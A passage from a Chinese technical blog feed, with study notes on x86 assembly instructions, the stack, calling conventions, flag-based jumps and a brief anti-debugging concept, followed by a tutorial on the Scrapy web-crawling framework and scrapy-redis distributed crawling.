b</td><td></td></tr><tr><td>OR a,b</td><td>或，a</td><td>= b</td></tr><tr><td>NOT a,b</td><td>非，a != b</td><td></td></tr><tr><td>XOR a,b</td><td>异或，a ^= b</td><td></td></tr><tr><td>MOVS a,b</td><td>内存b存储到内存a，并a和b的指针自动+1或者-1（取决于标志位D），适合拷贝<code>MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]</code></td><td></td></tr><tr><td>MOVSB a,b</td><td>简写形式，移动目标为byte</td><td></td></tr><tr><td>MOVSW a,b</td><td>简写形式，移动目标为word</td><td></td></tr><tr><td>MOVSD a,b</td><td>简写形式，移动目标为dword</td><td></td></tr><tr><td>STOS BYTE PTR ES:[EDI]</td><td>将AI、AX、EAX的值存储到EDI指定内存单元，指针自动+1或者-1</td><td></td></tr><tr><td>STOSB</td><td>简写形式，移动目标为byte</td><td></td></tr><tr><td>STOSW</td><td>简写形式，移动目标为word</td><td></td></tr><tr><td>STOSD</td><td>简写形式，移动目标为dword</td><td></td></tr><tr><td>REP</td><td>重复执行，执行次数取决于ECX的值，16进制：<code>MOV ECX 10</code><br><code>REP MOVSD a,b</code></td><td></td></tr><tr><td>CMP a,b</td><td>相当于SUB，判断是否为0，只是CMP不对a进行更改</td><td></td></tr><tr><td>TEST a,b</td><td>相当于AND，判断是否为0，只是TEST不对a进行更改</td><td></td></tr></tbody></table><h1 id="堆栈"><a class="markdownIt-Anchor" href="#堆栈"></a> 堆栈</h1><ul><li>程序开启后，系统会分配堆栈空间，用于存储中间状态的值。这块空间如果程序用完，就会发生栈溢出异常。</li><li>堆栈从高地址开始使用，直到低地址。</li><li>ESP寄存器保存了栈指针。</li></ul><table><thead><tr><th>指令</th><th></th><th></th></tr></thead><tbody><tr><td>PUSH mem/reg/立即数</td><td>将reg或者立即数存入堆栈，ESP减4，根据压入的是什么</td><td></td></tr><tr><td>POP reg/mem</td><td>弹出，ESP加4</td><td></td></tr></tbody></table><h1 id="eip寄存器"><a class="markdownIt-Anchor" href="#eip寄存器"></a> EIP寄存器</h1><ul><li>cpu下一次执行的地址，EIP修改只能通过JMP、CALL修改</li></ul><table><thead><tr><th>指令</th><th></th><th></th></tr></thead><tbody><tr><td>JMP reg、立即数、mem</td><td>EIP更改值，mem必须是dword</td><td></td></tr><tr><td>CALL reg、立即数、mem</td><td>EIP更改值，并保护现场，放入堆栈，栈顶-4</td><td></td></tr><tr><td>RET</td><td>EIP更改为堆栈，恢复现场，栈顶+4</td><td></td></tr></tbody></table><h1 id="反调试"><a class="markdownIt-Anchor" href="#反调试"></a> 反调试</h1><h2 id="fake-f8"><a class="markdownIt-Anchor" href="#fake-f8"></a> Fake F8</h2><ul><li><p>调式中F7单步步入，F8是单步步过</p></li><li><p>调试原理：</p><ul><li>在某一行下断点，实际是将对应的语句改为了<code>int 3</code>，对应的十六进制是<code>CC</code>，中断，停到调试器</li><li>单步执行的原因是在EFL的TF标志位为1，cpu就会进入单步执行模式</li></ul></li><li><p>F7是单步执行，而F8在遇到CALL指令时，会在下一个语句改为<code>int 3</code>，并将当前指令存到堆栈中。</p></li><li><p>Fake F8欺骗的是进入到CALL中时，修改了ESP的值，此时返回时，F8就失效了</p></li><li><p>在程序中CALL比较多的时候，想跳过CALL就无法实现了，这样给反调试带来困难。</p></li></ul><h1 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h1><h2 id="函数调用"><a class="markdownIt-Anchor" href="#函数调用"></a> 函数调用</h2><ul><li>一般不用JMP，无法返回原来的位置</li></ul><table><thead><tr><th>指令</th><th></th><th></th></tr></thead><tbody><tr><td>CALL reg、立即数、mem</td><td>EIP更改值，并保护现场，放入堆栈，栈顶-4</td><td></td></tr><tr><td>RET</td><td>EIP更改为堆栈，恢复现场，栈顶+4</td><td></td></tr></tbody></table><h2 id="函数参数"><a class="markdownIt-Anchor" href="#函数参数"></a> 函数参数</h2><ul><li>参数放到寄存器中，返回值放在EAX中</li><li>参数也可以放到堆栈中，要注意堆栈平衡</li></ul><h2 id="esp寻址"><a class="markdownIt-Anchor" href="#esp寻址"></a> ESP寻址</h2><ul><li>数据放入堆栈后的寻址，由于存储的栈指针，所以计算相对麻烦</li></ul><h2 id="ebp寻址"><a class="markdownIt-Anchor" href="#ebp寻址"></a> EBP寻址</h2><ul><li>通过改变栈底指针，可以避免新增数据导致的地址便宜计算。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUSH 1</span><br><span class="line">PUSH 2</span><br><span class="line">CALL XXXXX</span><br><span class="line">ADD ESP,8</span><br><span class="line">---------XXXXX---------</span><br><span class="line">PUSH EBP</span><br><span class="line">MOV EBP ESP</span><br><span class="line">SUB ESP,10</span><br><span class="line">MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">ADD EAX,DWORD PTR SS:[EBP+C]</span><br><span class="line">MOV ESP,EBP</span><br><span class="line">POP EBP</span><br><span class="line">RETN</span><br></pre></td></tr></table></figure><h1 id="jcc指令"><a class="markdownIt-Anchor" href="#jcc指令"></a> JCC指令</h1><h2 id="标记寄存器"><a class="markdownIt-Anchor" href="#标记寄存器"></a> 标记寄存器</h2><ul><li>标记寄存器状态的变化是由于数据计算引起的。</li></ul><p><img src="/images/pasted-68.png" alt="标记寄存器" /></p><ul><li>CF：最高有效位发生借位，则置1。用于判断无符号数运算是否溢出</li><li>PF：结果的最低有效字节包含偶数个1，则置1。用于奇偶校验检查</li><li>AF：辅助进位操作，在结果的第3位发生进位或借位时置1。在BCD算数运算中使用</li><li>ZF：运算结果为0，则置1。与CMP和TEST指令一起使用，查看是不是0</li><li>SF：符号位，有符号整型的最高位</li><li>OF：溢出标志位。用于判断有符号数运算是否溢出。</li><li>DF：方向标志位，地址由低向高，则为0</li></ul><h2 id="jcc指令-2"><a class="markdownIt-Anchor" href="#jcc指令-2"></a> JCC指令</h2><table><thead><tr><th>指令</th><th>说明</th><th>判断条件</th></tr></thead><tbody><tr><td>JE JZ</td><td>结果为零则跳转（相等时跳转）</td><td>ZF=1</td></tr><tr><td>JNE JNZ</td><td>结果不为零则跳转（不相等时跳转）</td><td>ZF=0</td></tr><tr><td>JS</td><td>结果为负则跳转</td><td>SF=1</td></tr><tr><td>JNS</td><td>结果不为负则跳转</td><td>SF=0</td></tr><tr><td>JP JPE</td><td>结果中1的个数为偶数则跳转</td><td>PF=1</td></tr><tr><td>JNP JPO</td><td>结果中1的个数为奇数则跳转</td><td>PF=0</td></tr><tr><td>JO</td><td>结果溢出了则跳转</td><td>OF=1</td></tr><tr><td>JNO</td><td>结果没有溢出则跳转</td><td>OF=0</td></tr><tr><td>JB JNAE</td><td>小于则跳转（无符号数）</td><td>CF=1</td></tr><tr><td>JNB JAE</td><td>大于等于则跳转（无符号数）</td><td>CF=0</td></tr><tr><td>JBE JNA</td><td>小于等于则跳转（无符号数）</td><td>CF=1 OR ZF=1</td></tr><tr><td>JNBE JA</td><td>大于则跳转（无符号数）</td><td>CF=0 AND ZF=0</td></tr><tr><td>JL JNGE</td><td>小于则跳转（有符号数）</td><td>SF!=OF</td></tr><tr><td>JNL JGE</td><td>大于等于则跳转（有符号数）</td><td>SF=OF</td></tr><tr><td>JLE JNG</td><td>小于等于则跳转（有符号数）</td><td>ZF=1 OR SF!=OF</td></tr><tr><td>JNLE JG</td><td>大于则跳转（有符号数）</td><td>ZF=0 AND SF=OF</td></tr></tbody></table><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> assembler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy</title>
      <link href="/2020/07/26/scrapy/"/>
      <url>/2020/07/26/scrapy/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>scrapy记录</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><h2 id="功能"><a class="markdownIt-Anchor" href="#功能"></a> 功能</h2><ul><li>持久化</li><li>数据下载</li><li>数据解析</li><li>分布式</li></ul><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><table><thead><tr><th>安装</th><th></th></tr></thead><tbody><tr><td>执行安装命令</td><td>linux: <code>pip3 install scrapy</code><br>windows <code>python -m pip install -U pip</code><br><code>pip intsall lxml</code><br><code>pip install wheel</code><br><code>wget https://download.lfd.uci.edu/pythonlibs/w3jqiv8s/Twisted-20.3.0-cp37-cp37m-win_amd64.whl</code><br><code>pip install Twisted-20.3.0-cp37-cp37m-win_amd64.whl</code><br><code>pip install pywin32</code><br><code>pip install scrapy</code><br></td></tr><tr><td>检测是否安装成功</td><td>终端执行<code>scrapy</code></td></tr></tbody></table><ul><li>遇到</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from cryptography.hazmat.bindings._openssl import ffi, lib</span><br><span class="line">ImportError: DLL load failed: 找不到指定的程序。</span><br></pre></td></tr></table></figure><ul><li>需要重新安装openssl</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip uninstall pyopenssl</span><br><span class="line">pip uninstall cryptography</span><br><span class="line">pip install pyopenssl</span><br><span class="line">pip install cryptography</span><br></pre></td></tr></table></figure><h2 id="简单使用"><a class="markdownIt-Anchor" href="#简单使用"></a> 简单使用</h2><table><thead><tr><th>简单使用</th><th></th></tr></thead><tbody><tr><td>创建项目</td><td><code>scrapy startproject 项目名称</code></td></tr><tr><td>创建任务</td><td><code>cd 项目名称</code><br><code>scrapy genspider 任务名称 www.baidu.com</code></td></tr><tr><td>执行任务</td><td><code>scrapy crawl 任务名称</code></td></tr><tr><td>pycharm调试</td><td><code>from scrapy import cmdline``cmdline.execute(&quot;scrapy crawl dmoz&quot;.split())</code></td></tr></tbody></table><h2 id="交互模式"><a class="markdownIt-Anchor" href="#交互模式"></a> 交互模式</h2><ul><li>进入交互模式：<code>scrapy shell quotes.toscrap.com</code></li><li>执行命令：<code>quotes = response.css('.quote')</code></li></ul><h2 id="指令汇总"><a class="markdownIt-Anchor" href="#指令汇总"></a> 指令汇总</h2><table><thead><tr><th>global指令</th><th></th></tr></thead><tbody><tr><td>startproject</td><td>创建项目</td></tr><tr><td>genspider</td><td>创建spider</td></tr><tr><td>settings</td><td>获取配置信息</td></tr><tr><td>runspider</td><td>执行spider</td></tr><tr><td>shell</td><td>命令行交互模式</td></tr><tr><td>fetch</td><td>简单抓取某个网页</td></tr><tr><td>view</td><td>把网页保存成文件，再用浏览器打开</td></tr><tr><td>version</td><td>scrapy版本信息</td></tr></tbody></table><table><thead><tr><th>项目指令</th><th></th></tr></thead><tbody><tr><td>crawl</td><td>执行spider的方法</td></tr><tr><td>check</td><td>检查代码是否有错误</td></tr><tr><td>list</td><td>所有spider名称</td></tr><tr><td>edit</td><td>编辑spider</td></tr><tr><td>parse</td><td></td></tr><tr><td>bench</td><td>测试，运行的性能</td></tr></tbody></table><h1 id="设置"><a class="markdownIt-Anchor" href="#设置"></a> 设置</h1><ul><li>设置settings.py文件</li></ul><table><thead><tr><th>设置示例</th><th></th></tr></thead><tbody><tr><td>设置log级别</td><td><code>LOG_LEVEL = &quot;WARNING” # DEBUG INFO WARN ERROR FATAL</code></td></tr><tr><td>项目名称</td><td><code>BOT_NAME=默认： 'scrapybot' 这将用于默认情况下构造 User-Agent，也用于日志记录。当您使用startproject命令创建项目时，它会自动填充您的项目名称。</code></td></tr><tr><td>启用中间件</td><td>设置请求头<code>USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'</code></td></tr><tr><td>是否遵守robots协议，默认是遵守</td><td><code>ROBOTSTXT_OBEY = True</code></td></tr><tr><td>设置并发请求的数量，默认是16个</td><td><code>CONCURRENT_REQUESTS</code></td></tr><tr><td>下载延迟，默认无延迟</td><td><code>DOWNLOAD_DELAY</code></td></tr><tr><td>开启cookie，每次请求带上前一次cookie，默认开启</td><td><code>COOKIES_ENABLED</code></td></tr><tr><td>开启cookie显示</td><td><code>COOKIES_DEBUG</code></td></tr><tr><td>设置默认请求头</td><td><code>DEFAULT_REQUEST_HEADERS</code></td></tr><tr><td>爬虫中间件，设置过程和管道相同</td><td><code>SPIDER_MIDDLEWARES</code></td></tr><tr><td>下载中间件</td><td><code>DOWNLOADER_MIDDLEWARES</code></td></tr></tbody></table><h1 id="选择器"><a class="markdownIt-Anchor" href="#选择器"></a> 选择器</h1><ul><li>response.selector类</li></ul><table><thead><tr><th>选择器</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>xpath</td><td>response.xpath方法的返回结果是一个类似list的类型，其中包含的是selector对象，操作和列表一样，但是有一些额外的方法</td><td><code>response.selector.xpath(&quot;//title/text()&quot;)</code></td></tr><tr><td>css</td><td></td><td><code>response.selector.css(&quot;title::text&quot;)</code></td></tr><tr><td>简写模式</td><td></td><td><code>response.xpath(&quot;//title/text()&quot;).extract_first()</code><br><code>response.css(&quot;title::text&quot;).extract_first()</code></td></tr><tr><td>迭代查找</td><td></td><td><code>response.xpath(&quot;//title/text()&quot;).css(&quot;title::text&quot;)</code></td></tr><tr><td>获取属性</td><td></td><td><code>response.xpath(&quot;//title&quot;).css(&quot;img::attr(src)&quot;)</code></td></tr><tr><td>防止报错，设置默认提取</td><td></td><td><code>response.xpath(&quot;//title/text()&quot;).extract_first(default='')</code></td></tr><tr><td>获取内容</td><td>extract() 返回一个包含有字符串的列表<br>extract_first() 返回列表中的第一个字符串，列表为空没有返回None</td><td>``</td></tr><tr><td>正则表达式匹配</td><td></td><td><code>response.re(&quot;name:'(.*?)'&quot;)</code><br><code>response.re_first(&quot;name:'(.*?)'&quot;)</code></td></tr></tbody></table><h1 id="执行器"><a class="markdownIt-Anchor" href="#执行器"></a> 执行器</h1><ul><li>scrapy.spider.Spider基类</li></ul><table><thead><tr><th>执行器</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>name</td><td>spider名字，是任务的唯一标识</td><td></td></tr><tr><td>start_urls</td><td>URL列表，起始。要实现不停的爬取，需要重写start_url，设置while、True，然后将don’t_filter设置为True</td><td></td></tr><tr><td>allowed_domains</td><td>需要开启offsiteMiddleware，允许爬取的域名列表。需要抓取的、url地址必须属于allowed_domains,但是start_urls中的url地址没有这个限制</td><td></td></tr><tr><td>crawler</td><td>提供对spider核心组件的访问</td><td></td></tr><tr><td>setting</td><td>控制核心插件的配置</td><td></td></tr><tr><td>from_crawler</td><td>可以通过它获取全局配置</td><td></td></tr><tr><td>custom_settings</td><td>覆盖settings全局的配置</td><td></td></tr><tr><td>start_requests</td><td>可以改写请求方式<code>Request(url=&quot;http://www.example.com&quot;,|cookies=&#123;'currency': 'USD', 'country': 'UY'&#125;)</code></td><td></td></tr><tr><td>parse</td><td>回调函数，spider中的parse方法必须有返回值，需要通过yield返回可以传递给管道，只能返回request、baseitem、dict和none值<br>callback：默认是parse处理的<br>headers：<br>meta：实现数据的传递，需要注意，传递字典和列表时，要用eepcopy操作，否则在后续调用时引用相同，会造成数据错乱。<br>error_back：设置错误处理的函数，决定执行的逻辑。<br>filter：请求过的url将被过滤，默认为过滤</td><td></td></tr><tr><td>log</td><td>message<br>level</td><td></td></tr><tr><td>closed</td><td></td><td></td></tr><tr><td>自定义参数</td><td></td><td></td></tr><tr><td>POST请求formRequest</td><td></td><td></td></tr></tbody></table><ul><li>response对象</li></ul><table><thead><tr><th>属性</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>response.body</td><td>响应体，也就是html代码，默认是byte类型</td><td></td></tr><tr><td>response.body_as_unicode</td><td>响应体</td><td></td></tr><tr><td>response.copy</td><td></td><td></td></tr><tr><td>response.css</td><td></td><td></td></tr><tr><td>response.encoding</td><td></td><td></td></tr><tr><td>response.flags</td><td></td><td></td></tr><tr><td>response.follow</td><td>补全地址</td><td></td></tr><tr><td>response.headers</td><td>响应头</td><td></td></tr><tr><td>response.meta</td><td></td><td></td></tr><tr><td>response.replace</td><td></td><td></td></tr><tr><td>response.requests.headers</td><td>当前响应的请求头</td><td></td></tr><tr><td>response.request.url</td><td>当前响应对应的请求的url地址</td><td></td></tr><tr><td>response.selector</td><td></td><td></td></tr><tr><td>response.status</td><td></td><td></td></tr><tr><td>response.text</td><td></td><td></td></tr><tr><td>response.url</td><td>当前响应的url地址</td><td></td></tr><tr><td>response.urljoin</td><td></td><td></td></tr><tr><td>response.xpath</td><td></td><td></td></tr></tbody></table><ul><li>spider对象</li></ul><table><thead><tr><th>属性</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>spider.close</td><td></td><td></td></tr><tr><td>spider.crawler</td><td></td><td></td></tr><tr><td>spider.custom_settings</td><td></td><td></td></tr><tr><td>spider.from_crawler</td><td></td><td></td></tr><tr><td>spider.handles_request</td><td></td><td></td></tr><tr><td>spider.log</td><td></td><td></td></tr><tr><td>spider.logger</td><td></td><td></td></tr><tr><td>spider.make_requests_from_url</td><td></td><td></td></tr><tr><td><a href="http://spider.name">spider.name</a></td><td></td><td></td></tr><tr><td>spider.parse</td><td></td><td></td></tr><tr><td>spider.set_crawler</td><td></td><td></td></tr><tr><td>spider.settings</td><td></td><td></td></tr><tr><td>spider.start_requests</td><td></td><td></td></tr><tr><td>spider.start_urls</td><td></td><td></td></tr><tr><td>spider.update_settings</td><td></td><td></td></tr></tbody></table><ul><li>request对象<ul><li><code>yield scrapy.Request(url,callback,meta)</code></li></ul></li></ul><table><thead><tr><th>属性</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>request.body</td><td></td><td></td></tr><tr><td>request.callback</td><td></td><td></td></tr><tr><td>request.cookies</td><td>设定cookie信息</td><td><code>scrapy.Request(cookies=cookie)</code></td></tr><tr><td>request.copy</td><td></td><td></td></tr><tr><td>request.dont_filter</td><td></td><td></td></tr><tr><td>request.encoding</td><td></td><td></td></tr><tr><td>request.errback</td><td></td><td></td></tr><tr><td>request.flags</td><td></td><td></td></tr><tr><td>request.headers</td><td></td><td></td></tr><tr><td>request.meta</td><td></td><td></td></tr><tr><td>request.method</td><td></td><td></td></tr><tr><td>request.priority</td><td></td><td></td></tr><tr><td>request.replace</td><td></td><td></td></tr><tr><td>request.url</td><td></td><td></td></tr></tbody></table><ul><li>FormRequest对象</li><li>用于post请求<code>scrapy.FormRequest(url=url,formdata=data,callback=self.parse)</code></li></ul><table><thead><tr><th>属性</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>formdata</td><td>post数据</td><td></td></tr></tbody></table><h1 id="item和管道"><a class="markdownIt-Anchor" href="#item和管道"></a> item和管道</h1><h2 id="item"><a class="markdownIt-Anchor" href="#item"></a> item</h2><ul><li>item类型对象<ul><li>用于定义要存储的数据结构</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XXXItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    author = scrapy.Field()</span><br><span class="line">    content = scrapy.Field()</span><br></pre></td></tr></table></figure><ul><li>在spider获取的数据建立XXXItem对象，并对author和content赋值，yield即可传递给管道。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">item = XXXItem()</span><br><span class="line">item[<span class="string">&#x27;author&#x27;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line">item[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><h2 id="pipeline"><a class="markdownIt-Anchor" href="#pipeline"></a> pipeline</h2><ul><li>pipeline对象<ul><li>pipeline中process_item的方法必须有，否则item没有办法接受和处理；</li><li>有多个pipeline的时候，process_item的方法必须return item,否则后一个pipeline取到的数据为None值</li><li>process_item方法接受item和spider，其中spider表示当前传递item过来的spider</li><li>使用之前需要在settings中开启，优先级：0~1000</li><li>pipeline在settings中能够开启多个，实现不同的pipeline可以处理不同爬虫的数据，不同的pipeline能够进行不同的数据处理的操作，比如一个进行数据清洗，一个进行数据的保存</li></ul></li></ul><table><thead><tr><th>pipeline</th><th></th></tr></thead><tbody><tr><td>process_item</td><td>返回两种：1、item；2、dropitem</td></tr><tr><td>open_spider</td><td>spider开启调用一次</td></tr><tr><td>close_spider</td><td>spider关闭调用一次</td></tr><tr><td>from_crawler</td><td>获取项目配置信息</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XXXPipline</span>:</span></span><br><span class="line">    fp = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        self.fp = open(<span class="string">&quot;./xxx.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self,item,spider</span>):</span></span><br><span class="line">        author = item[<span class="string">&quot;author&quot;</span>]</span><br><span class="line">        content = item[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">        self.fp.write(<span class="string">&quot;&#123;&#125;:&#123;&#125;\n&quot;</span>.format(author,content))</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        self.fp.close()</span><br></pre></td></tr></table></figure><h2 id="imagepipeline"><a class="markdownIt-Anchor" href="#imagepipeline"></a> ImagePipeline</h2><ul><li>在settings.py中设置文件保存的目录</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">IMAGES_STORE = <span class="string">&#x27;datas&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>设置图片pipeline，还有保存的名字</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.pipeline <span class="keyword">import</span> ImagesPipline</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XXXImagePipline</span>(<span class="params">ImagesPipeline</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_media_requests</span>(<span class="params">self,item,info</span>):</span></span><br><span class="line">        <span class="keyword">return</span> [Request(x,meta=&#123;<span class="string">&#x27;item&#x27;</span>:item&#125;) <span class="keyword">for</span> x <span class="keyword">in</span> item[<span class="string">&#x27;image_url&#x27;</span>]]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">file_path</span>(<span class="params">self,request,response=None,info=None</span>):</span></span><br><span class="line">        item = request.meta[<span class="string">&quot;item&quot;</span>]</span><br><span class="line">        path = item[<span class="string">&#x27;title&#x27;</span>]item[<span class="string">&#x27;image_urls&#x27;</span>].index(request.url)+<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> path</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">item_completed</span>(<span class="params">self,results,item,info</span>):</span></span><br><span class="line">      <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><table><thead><tr><th>ImagesPipeline</th><th></th></tr></thead><tbody><tr><td>get_media_requests</td><td>根据图片地址，进行图片数据请求</td></tr><tr><td>file_path</td><td>指定图片存储的路径</td></tr><tr><td>item_completed</td><td>返回item，给下一个pipeline</td></tr></tbody></table><h1 id="中间件"><a class="markdownIt-Anchor" href="#中间件"></a> 中间件</h1><h2 id="爬虫中间件"><a class="markdownIt-Anchor" href="#爬虫中间件"></a> 爬虫中间件</h2><ul><li>spiderMiddleware</li></ul><h2 id="下载中间件"><a class="markdownIt-Anchor" href="#下载中间件"></a> 下载中间件</h2><ul><li>位于引擎和下载器之间，下载中间件可以拦截所有请求，以及所有请求返回相应对象。</li><li>功能：UA修改，Proxy修改；篡改相应</li></ul><table><thead><tr><th>ImagesPipeline</th><th></th></tr></thead><tbody><tr><td>from_crawler</td><td></td></tr><tr><td>process_request</td><td>拦截请求<br>输入request,spider<br>需要返回数据<br>None：返回none不会对框架产生影响，继续向后执行中间件，<br>Response：返回Response，不在调用其他中间件的request方法，而调用process_response方法<br>request：返回request，则会把request重新放入项目队列中去，循环往复的调度<br>raise</td></tr><tr><td>process_response</td><td>拦截相应<br>输入：request、response、spider<br>返回<br>Response：返回Response，不会对框架产生影响，继续向后执行中间件<br>request：返回request，则会把request重新放入项目队列中去，循环往复的调度<br>raise</td></tr><tr><td>process_exception</td><td>拦截异常<br>输入：request、response、spider<br>返回：<br>None：返回None不会对框架产生影响，继续向后执行中间件<br>Response：返回Response，不在调用其他中间件的request方法，而调用process_response方法，成功的放回<br>request：返回request，则会把request重新放入项目队列中去，循环往复的调度，相当于重新发送请求<br>raise</td></tr></tbody></table><h1 id="scrapy分布式"><a class="markdownIt-Anchor" href="#scrapy分布式"></a> scrapy分布式</h1><ul><li><p>项目路径：<a href="https://gitHub.com/rolando/srcapy-redis">gitHub.com/rolando/srcapy-redis</a></p></li><li><p>scrapy-redis是scrapy的组件，通过redis与调度器连接，存放调度器传递过来的指纹，存放request对象，默认存放redispipe保存的数据。</p></li><li><p>增量式爬虫，基于request对象的增量、基于数据的增量</p></li><li><p>实现request对象的指纹去重，使用sha1，加密请求方法、url地址、请求体得到16进制字符串。指纹存在redisset中，判断redis.sadd()存在则返回0</p></li></ul><h2 id="安装-2"><a class="markdownIt-Anchor" href="#安装-2"></a> 安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install scrapy_redis</span><br></pre></td></tr></table></figure><h2 id="实现增量式爬虫"><a class="markdownIt-Anchor" href="#实现增量式爬虫"></a> 实现增量式爬虫</h2><table><thead><tr><th>增量爬虫设置</th><th></th></tr></thead><tbody><tr><td>更改调度器</td><td><code>SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;</code></td></tr><tr><td>去重</td><td><code>DUPEFILTER_CLASS=&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</code></td></tr><tr><td>调度器持久化存储</td><td><code>SCHEDULER_PERSIST = True</code>不清空redis指纹，建议为false</td></tr><tr><td>redis连接</td><td><code>REDIS_URL=&quot;redis://root:user@ip:port&quot;</code></td></tr><tr><td>清空之前的所有指纹，重新爬取</td><td><code>SCHEDULER_FLUSH_ON_START=True</code></td></tr></tbody></table><ul><li>settings代码如下</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DUPEFILTER_CLASS = <span class="string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span></span><br><span class="line">SCHEDULER = <span class="string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span></span><br><span class="line">SCHEDULER_PERSIST = <span class="literal">True</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">&#x27;example.pipelines.ExamplePipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="string">&#x27;scrapy_redis.pipelines.RedisPipeline&#x27;</span>: <span class="number">400</span>,</span><br><span class="line">&#125;</span><br><span class="line">REDIS_URL = <span class="string">&quot;redis://127.0.0.1:6379&quot;</span></span><br><span class="line"> <span class="comment">#或者使用下面的方式</span></span><br><span class="line"> <span class="comment"># REDIS_HOST = &quot;127.0.0.1&quot;</span></span><br><span class="line"> <span class="comment"># REDIS_PORT = 6379</span></span><br></pre></td></tr></table></figure><ul><li>scrapy-redis将下面三个内容在redis中储存：<ol><li>Scheduler队列：存放待请求的request对象，过程是pop操作，获取一个去除一个。</li><li>指纹集合：存放已经进入Scheduler队列的request对象的指纹，指纹默认由请求方法、url和请求体组成</li><li>item信息：只有开启RedisPipeline才会存入。</li></ol></li></ul><h2 id="分布式爬虫redisspider"><a class="markdownIt-Anchor" href="#分布式爬虫redisspider"></a> 分布式爬虫RedisSpider</h2><ul><li>配置跟增量相同</li><li>实现代码</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Spider that reads urls from redis queue (myspider:start_urls).&quot;&quot;&quot;</span></span><br><span class="line">    name = <span class="string">&#x27;myspider_redis&#x27;</span></span><br><span class="line">redis_key = <span class="string">&#x27;myspider:start_urls&#x27;</span></span><br><span class="line"><span class="comment"># 手动指定allow_domains=[‘baidu.com’]</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="comment"># Dynamically define the allowed domains list.</span></span><br><span class="line">        domain = kwargs.pop(<span class="string">&#x27;domain&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        self.allowed_domains = filter(<span class="literal">None</span>, domain.split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">        super(MySpider, self).__init__(*args, **kwargs)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="keyword">return</span> 